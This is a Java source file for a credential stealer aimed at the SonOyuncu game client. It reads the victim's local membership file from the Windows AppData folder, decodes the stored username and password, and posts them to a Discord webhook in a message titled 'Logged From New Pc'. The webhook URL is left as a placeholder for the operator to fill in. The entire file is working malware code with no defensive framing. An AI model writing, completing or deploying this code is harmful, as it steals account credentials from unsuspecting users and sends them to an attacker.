package wrap.dev.discord;

import java.io.File;

import java.io.OutputStream; 
import java.net.URL;

import javax.net.ssl.HttpsURLConnection;


import wrap.dev.JsonSonOyuncuMembership;
import wrap.dev.MemberShipReader;

public class Discord {
	 private static String tokenWebhook = "your webhook";
	public static void send() {
		   ///////////////////////////////////////////////
        // CONFIG
		String membershipPath = "C:\\Users\\" + System.getProperty((String)"user.name") + "\\Appdata\\Roaming\\.sonoyuncu\\sonoyuncu-membership.json";
		JsonSonOyuncuMembership jsonSO = MemberShipReader.readMembershipJson(new File(membershipPath));
       
        String title = "Logged From New Pc :nerd: ";
        String message = "Username : " + jsonSO.getSonOyuncuUsername()+ " **|** Password : " + jsonSO.getDecodedSonOyuncuPassword();
        ///////////////////////////////////////////////
        String jsonBrut = "";
        jsonBrut += "{\"embeds\": [{"
                + "\"title\": \""+ title +"\","
                + "\"description\": \""+ message +"\","
                + "\"color\": 15258703"
                + "}]}";
        try {
            URL url = new URL(tokenWebhook);
            HttpsURLConnection con = (HttpsURLConnection) url.openConnection();
            con.addRequestProperty("Content-Type", "application/json");
            con.addRequestProperty("User-Agent", "DEv");
            con.setDoOutput(true);
            con.setRequestMethod("POST");
            OutputStream stream = con.getOutputStream();
            stream.write(jsonBrut.getBytes());
            stream.flush();
            stream.close();
           con.getInputStream().close();
            con.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
	}
	

